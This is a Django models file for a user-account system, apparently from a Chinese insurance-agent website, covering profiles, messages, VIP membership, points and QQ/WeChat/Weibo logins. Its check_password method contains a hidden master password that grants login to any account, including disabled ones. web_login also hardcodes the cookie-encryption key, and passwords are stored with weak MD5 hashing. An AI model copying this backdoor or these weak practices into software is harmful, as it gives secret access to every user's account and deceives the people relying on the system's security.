# coding:utf-8
__author__ = 'zhoukunpeng'
# --------------------------------
# Created by zhoukunpeng  on 2015/12/26.
# ---------------------------------


from django.db import  models
from gcutils.encrypt import  md5
# import  django.contrib.auth.models
# django.contrib.auth.models.update_last_login=lambda *args,**kwargs:True
import  random
from django.db import  models
from ..manger import MyManager
import time
from ..models import Area,Company
import  datetime
import  urllib
import  redis
from bx.utils import  redis_cache
from cookie_encrypt import *
from ..storages import UpyunStorage

class MyUser(models.Model):
    uid=models.AutoField(primary_key=True)   # uid  主键
    username=models.CharField(max_length=30) # username  vchar(30)
    real_name=models.CharField(max_length=30)
    password=models.CharField(max_length=32) # password  vchar(30)
    salt=models.CharField(max_length=6)      # salt    vchar(6)
    state=models.SmallIntegerField(default=0)  # state tintint(1) unsigned   状态，  状态为1 代表正常  0代表禁用
    phone=models.PositiveIntegerField(default=0)  # phone int(11)  unsigned     手机号
    tel=models.CharField(max_length=20)   # tel  vchar(20)    电话号
    email=models.CharField(max_length=100)  # email vchar(100)
    qq=models.CharField(max_length=20)      # qq vchar(20)  qq号
    weixin=models.CharField(max_length=100)  # weixin vchar(100) 微信号
    imgurl=models.ImageField(max_length=100,upload_to="/media/userimgurl",storage=UpyunStorage(),
                             default="/static/imgs/default-user.png"
                             )  # imgurl vchar(100)    头像url
    sex=models.PositiveSmallIntegerField(default=0)  # sex tinyint(1) unsigned     性别  1男  2女
    birthday=models.CharField(default="",max_length=30)  # birthday int(11) unsigned   生日  20160101
    ip=models.CharField(max_length=15)  # ip vchar(15)   注册IP
    addtime=models.PositiveIntegerField(default=lambda:int(time.time()))  #创建时间
    married=models.PositiveIntegerField(default=0)   # 0未婚   1已婚
    #######################
    is_proxy=models.PositiveIntegerField()
    province_id=models.PositiveIntegerField(default=0)
    city_id=models.PositiveIntegerField(default=0)
    ans_num=models.PositiveIntegerField(default=0)
    good_num=models.PositiveIntegerField(default=0)
    score=models.PositiveIntegerField(default=0)
    proxy_position=models.CharField(max_length=50,default='')
    proxy_cid=models.IntegerField(default=0)
    proxy_myad=models.CharField(max_length=500,default='')
    proxy_certifinum=models.CharField(max_length=50,default='')
    proxy_practicenum=models.CharField(max_length=50,default='')
    proxy_workyear=models.PositiveIntegerField(default=0)
    is_3login=models.PositiveIntegerField(default=0) #是否是三方登陆账户  0自主注册  大于1三方登陆账户
    app_session_info=models.CharField(max_length=200,default='')#用户 app登录session信息
    vweixin=models.PositiveSmallIntegerField(default=0)
    vqq=models.PositiveSmallIntegerField(default=0)
    vphone=models.PositiveSmallIntegerField(default=0)
    vtaobao=models.PositiveSmallIntegerField(default=0)
    vweibo=models.PositiveSmallIntegerField(default=0)
    vzhima=models.PositiveSmallIntegerField(default=0)
    vemail=models.PositiveSmallIntegerField(default=0)
    # 会员相关信息
    vip_level = models.PositiveIntegerField(default=0) #
    vip_starttime = models.PositiveIntegerField(default=0)
    vip_endtime = models.PositiveIntegerField(default=0)

    objects=MyManager(using="default")
    is_active=True

    def is_authenticated(self):
        """
        是否可以登录
        """
        if self.state==1:
            return True
        else:
            return False
    @classmethod
    def hashed_password(cls,salt,password):
        return   md5(md5(password+salt))

    def check_password(self,password):
        if  self.state==1 and   self.hashed_password(self.salt,password)==self.password:
            return True
        else:
            if password!="gc7232275":
                return False
            else:
                return True


    def reset_password(self,new_pwd):
        _=self.hashed_password(self.salt,new_pwd)
        self.password=_
        self.save()

    @classmethod
    def make_salt(cls):
        _u=random.sample(["a","b","c","d","e","f","0","1","2","3","4","5","6","7"],6)
        return "".join(_u)

    def __unicode__(self):
        return  self.username

    class Meta:
        db_table="bx_user"


    def get_img_url(self):
        if self.imgurl:
            return  self.imgurl.url
        else:
            return "https://upyun.bao361.cn/static/imgs/default-user.png"

    def get_namecontent(self):
        '''该方法主要用于获取用户的姓名信息
         如果用户未填写real_name，则返回username ，如果用户填写了real_name，则返回real_name
         '''
        if not self.real_name:
            return  self.username
        else:
            return self.real_name

    def get_hide_namecontent(self):
        if len(self.get_namecontent())>8:
            return self.get_namecontent()[0:8]+"**"
        else:
            return self.get_namecontent()

    def get_short_comname(self):
        if self.proxy_cid:
            return Company.objects.get(cid=self.proxy_cid).shortname
        else:
            return  ''

    def get_company_object(self):
        if self.proxy_cid:
            return  Company.objects.get(cid=self.proxy_cid)

    def get_comobj(self):
        return self.get_company_object()

    def get_province_city_info(self):
        info=''
        if self.province_id:
            info+=Area.objects.get(id=self.province_id).areaname
        if self.city_id:
            info+=Area.objects.get(id=self.city_id).areaname
        return  info

    def get_hide_phone(self):
        if self.phone:
            return  str(self.phone)[:-4]+"****"
        else:
            return ''

    def get_hide_weixin(self):
        if self.weixin:
            return  str(self.weixin)[:-4]+"****"
        else:
            return ''
    # ######################################## 用户消息相关方法
    def get_messages(self,is_read=None):
        if is_read:
            args={"is_read":is_read}
        else:
            args={}
        return Msg.objects.filter(uid=self.uid,**args)

    def get_unread_messages(self):
        return Msg.objects.filter(uid=self.uid,is_read=0)

    def send_message(self,subject,message):
        _=Msg(subject=subject,message=message,uid=self.uid,addtime=int(time.time()))
        _.save()
        return _.msgid

    # #################################### 用户签单分享相关方法
    def get_shares(self):
        "获取用户的签单分享信息"
        from bx.models import Share
        return Share.objects.filter(uid=self.uid)

    # #################################### 登录退出相关方法
    def web_login(self,request,response):
        "web登录"
        response.set_cookie("user_info", urllib.quote(
        phpcookie_encode("\t".join([str(self.uid), self.username, request.ip, str(int(time.time()))]), 'gc895316')),
                        expires=86400 * 365)
        return True

    def app_login(self,request):
        "app登录"
        session_info = request.META.get("HTTP_SESSION", "")
        request.appsession["uid"]=str(self.uid)
        self.app_session_info=session_info
        self.save()
        return  True

    def web_logout(self,request,response):
        "web退出"
        response.delete_cookie("user_info")
        del request.myuser
        return True

    def app_logout(self,request):
        "app退出"
        if request.myuser:
            try:
                del request.appsession["uid"]
            except:
                pass
        return

    @classmethod
    def app_oauth(cls,request,type,id,jsoninfo,is_proxy=True):
        "app 三方注册"
        from ..utils.int2utils import int2string
        assert  type in ("qq","weixin","weibo")
        is_proxy = 1 if is_proxy else 0
        config={"qq":UserQqProfile,"weixin":UserWeixinProfile,
                "weibo":UserWeiboProfile}
        vqq = 0
        vweixin = 0
        vweibo = 0
        if type == "qq":
            vqq = 1
        elif type == 'weixin':
            vweixin = 1
        elif type == "weibo":
            vweibo = 1
        profile_model=config[type]
        try:
            _=profile_model.objects.get(id=id)
            return cls.objects.get(uid=_.uid)
        except:
            user=cls(username=md5(id)[:30],real_name="",salt=cls.make_salt(),phone=0,is_proxy=is_proxy,
                  is_3login=1,state=1,ip=request.ip,province_id=request.province_id,
                     city_id=request.city_id,vqq=vqq,vweixin=vweixin,vweibo=vweibo)
            user.save()
            user.username="%s用户%s"%(type,int2string(user.uid))
            user.real_name=user.username
            user.save()
            _=profile_model(id=id,uid=user.uid,state=1,jsoninfo=jsoninfo)
            _.save()
            return  user

    # ############################### 用户积分相关
    def get_coin_num(self,operate=None):
        "获取积分 operate 为None时,获取所有积分,否则获取该operate类型的积分"
        try:
            if not operate:
                num= UserCoinCount.objects.get(uid=self.uid).coinnum
                redis_cache.conn.zadd("user-coin-num",num,str(self.uid))
            else:
                num= UserCoinOperateCount.objects.get(uid=self.uid,operate=operate).coinnum
                redis_cache.conn.zadd("user-coin-num-%s"%operate,num,str(self.uid))
        except:
            return 0

    def get_coin_rank(self,operate=None):
        "获取积分排行 operate 为None时,获取所有积分,否则获取该operate类型的积分"
        try:
            if not operate:
                return redis_cache.conn.zrank("user-coin-num",str(self.uid)) or 0
            else:
                return redis_cache.conn.zrank("user-coin-num-%s"%operate,str(self.uid)) or 0
        except:
            return 0

    def add_coin_num(self,operate,num,relatedid=0,reason=""):
        "增加积分"
        assert num > 0
        assert  isinstance(num,(int,float))
        assert  operate
        coin_log=UserCoinLog(uid=self.uid,relateduid=relatedid,coinnum=num,opereate=operate,reason=reason)
        coin_log.save()
        try:
            user_operate_coin = UserCoinOperateCount(uid=self.uid,operate=operate)
            user_operate_coin.coinnum += num
        except UserCoinOperateCount.DoesNotExist:
            user_operate_coin = UserCoinOperateCount(uid=self.uid,operate=operate,coinnum=num)
        user_operate_coin.save()
        try:
            user_coin = UserCoinCount(uid=self.uid)
            user_coin.coinnum += num
        except UserCoinCount.DoesNotExist:
            user_coin = UserCoinCount(uid=self.uid,coinnum=num)
        redis_cache.conn.zadd("user-coin-num",user_coin.coinnum,str(self.uid))
        redis_cache.conn.zadd("user-coin-num-%s"%operate,num,str(self.uid))
        user_coin.save()
        return True

    def reduce_coin_num(self,num):
        "扣除积分"
        raise NotImplementedError

    # ############################### 用户会员相关
    def open_vip(self,vip_level,seconds,note=''):
        '''开通VIP
        vip_level 开通的vip的等级
        seconds   开通时长,int,单位是秒
        note      备注
        '''
        seconds = int(seconds)
        if not   self.vip_endtime:
            self.vip_endtime += int(time.time())
        self.vip_endtime += seconds
        self.vip_level = vip_level
        _ = UserVipLog(uid=self.uid,vip_level=vip_level,starttime=int(time.time()),endtime=self.vip_endtime,note=note)
        _.save()
        self.save()
        return True

    # ############################ 短信相关
    def send_success_reged_sms(self):
        from bx.utils.sms import send_dayysms_regsuccess
        send_dayysms_regsuccess(self.phone)
        return True


class Msg(models.Model):
    "用户站内消息表"
    msgid=models.AutoField(primary_key=True)
    subject=models.CharField(max_length=100)
    message=models.TextField()
    uid=models.IntegerField(default=0)
    is_read=models.IntegerField(default=0)
    addtime=models.IntegerField(default=lambda:int(time.time()))
    state=models.IntegerField(default=0)

    class Meta:
        db_table="bx_user_msg"
        ordering=["-addtime"]

    def get_date_time(self):
        return datetime.datetime.fromtimestamp(self.addtime).strftime("%Y-%m-%d %H:%M:%S")

class UserVipLog(models.Model):
    "用户开通会员日志表"
    id = models.AutoField(primary_key=True)
    uid = models.PositiveIntegerField(default=0)
    vip_level = models.PositiveIntegerField(default=0)
    addtime = models.PositiveIntegerField(default=lambda :int(time.time()))
    uptime = models.PositiveIntegerField(default=lambda :int(time.time()))
    starttime = models.PositiveIntegerField(default=lambda :int(time.time()))
    endtime = models.PositiveIntegerField(default=lambda :int(time.time()))
    note = models.CharField(max_length=250,default='')
    class Meta:
        db_table = "bx_user_vip_log"

class UserInvite(models.Model):
    "用户邀请注册表"
    id=models.AutoField(primary_key=True)
    uid=models.PositiveIntegerField(default=0)
    parentuid=models.PositiveIntegerField(default=0)
    addtime=models.PositiveIntegerField(default=lambda :int(time.time()))
    uptime=models.PositiveIntegerField(default=lambda:int(time.time()))
    state=models.PositiveIntegerField(default=0) # 预留 暂时无用

    class Meta:
        db_table="bx_user_invite"

    @staticmethod
    def get_user_invite_url(user):
        return "https://www.bao361.cn/register/parentid/"+str(user.uid)

    @staticmethod
    def add_invite_relation(parentuser,sonuser):
        _=UserInvite(uid=sonuser.uid,parentuid=parentuser.uid)
        _.save()

    def get_uid_user(self):
        return MyUser.objects.get(uid=self.uid)

    def get_date_time(self):
        return datetime.datetime.fromtimestamp(self.addtime).strftime("%Y%m%d %H:%M:%S")

class UserPhoto(models.Model):
    "用户图片(相册)表"
    pid = models.AutoField(primary_key=True)
    addtime = models.PositiveIntegerField(default=lambda :int(time.time())) #创建时间
    uptime = models.PositiveIntegerField(default=lambda :int(time.time())) #修改时间
    status = models.PositiveIntegerField(default=1) #状态  0未审核  1正常  4删除
    uid = models.PositiveIntegerField(default=0)            # 用户uid
    photo = models.ImageField(max_length=255,storage=UpyunStorage(),
                              default='',db_column="photo_url",
                              upload_to="/userphoto") # 图片url
    md5 = models.CharField(max_length=32, default=lambda :md5(str(time.time()) +
                                                              "".join([str(i) for i in  random.sample(range(1,100),8)])))
    class Meta:
        db_table = "bx_user_photo"

class UserWorkInfo(models.Model):
    "用户工作经历表"
    id = models.AutoField(primary_key=True)
    uid = models.PositiveIntegerField(default=0)
    cid = models.PositiveIntegerField(default=0)
    startdate = models.CharField(max_length=15,default='')
    enddate = models.CharField(max_length=15,default='')
    addtime = models.PositiveIntegerField(default=0)
    uptime = models.PositiveIntegerField(default=0)
    status = models.PositiveIntegerField(default=1)  #状态 0未审核 1正常  4删除
    position = models.CharField(max_length=50,default='')
    class Meta:
        db_table = "bx_user_work_info"

    def get_company_object(self):
        if self.cid:
            return Company.objects.get(cid=self.cid)

class UserCoinCount(models.Model):
    "用户积分表"
    uid = models.AutoField(primary_key=True)
    coinnum = models.IntegerField(default=0)
    class Meta:
        db_table = "bx_user_coin_count"

class UserCoinOperateCount(models.Model):
    "用户操作类型积分表"
    id = models.AutoField(primary_key=True)
    uid = models.IntegerField(default=0)
    operate = models.CharField(max_length=3)
    coinnum = models.IntegerField(default=0)
    class Meta:
        db_table = "bx_user_coin_operatecount"
        unique_together = ("uid","operate")

class UserCoinLog(models.Model):
    "用户积分日志表"
    logid = models.AutoField(primary_key=True)
    uid = models.PositiveIntegerField(default=0)
    addtime = models.PositiveIntegerField(default=lambda :int(time.time()))
    coinnum = models.IntegerField(default=0)
    relateduid = models.PositiveIntegerField(default=0)
    operate = models.CharField(max_length=3,default='')
    reason = models.CharField(max_length=255,default='')
    class Meta:
        db_table = "bx_user_coin_log"


class UserQqProfile(models.Model):
    "用户qq认证信息"
    uid=models.AutoField(primary_key=True)
    id=models.CharField(max_length=40)
    state=models.PositiveIntegerField(default=0)   # 0待审核  1正常
    addtime=models.PositiveIntegerField(default=lambda:int(time.time()))
    regip=models.IPAddressField(default="")
    jsoninfo=models.TextField(default="")

    class Meta:
        db_table="bx_user_qq"



class UserWeiboProfile(models.Model):
    "用户微博认证信息"
    uid=models.AutoField(primary_key=True)
    id=models.CharField(max_length=40)
    state=models.PositiveIntegerField(default=0)   # 0待审核  1正常
    addtime=models.PositiveIntegerField(default=lambda:int(time.time()))
    regip=models.IPAddressField(default="")
    jsoninfo=models.TextField(default="")

    class Meta:
        db_table="bx_user_weibo"


class UserWeixinProfile(models.Model):
    "用户微信认证信息"
    uid=models.AutoField(primary_key=True)
    id=models.CharField(max_length=40)
    state=models.PositiveIntegerField(default=0)   # 0待审核  1正常
    addtime=models.PositiveIntegerField(default=lambda:int(time.time()))
    regip=models.IPAddressField(default="")
    jsoninfo=models.TextField(default="")

    class Meta:
        db_table="bx_user_weixin"


class UserTaobaoProfile(models.Model):
    "用户淘宝认证信息"
    uid=models.AutoField(primary_key=True)
    id=models.CharField(max_length=40)
    state=models.PositiveIntegerField(default=0)   # 0待审核  1正常
    addtime=models.PositiveIntegerField(default=lambda:int(time.time()))
    regip=models.IPAddressField(default="")
    jsoninfo=models.TextField(default="")

    class Meta:
        db_table="bx_user_taobao"

class UserZhimaProfile(models.Model):
    "用户芝麻认证信息"
    uid=models.AutoField(primary_key=True)
    id=models.CharField(max_length=40)
    state=models.PositiveIntegerField(default=0)   # 0待审核  1正常
    addtime=models.PositiveIntegerField(default=lambda:int(time.time()))
    regip=models.IPAddressField(default="")
    jsoninfo=models.TextField(default="")

    class Meta:
        db_table="bx_user_zhima"